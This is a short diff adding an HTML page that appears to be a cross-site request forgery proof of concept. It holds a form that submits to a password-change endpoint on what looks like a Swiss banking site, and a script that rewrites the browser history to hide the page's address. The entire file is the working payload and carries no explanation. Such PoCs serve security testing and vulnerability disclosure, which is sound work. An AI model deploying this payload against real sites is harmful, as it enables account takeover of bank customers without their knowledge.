@@ -1,0 +1,10 @@
+
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="https://my.swissbankers.ch/account/changedatasave?type=ChangePassword">
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
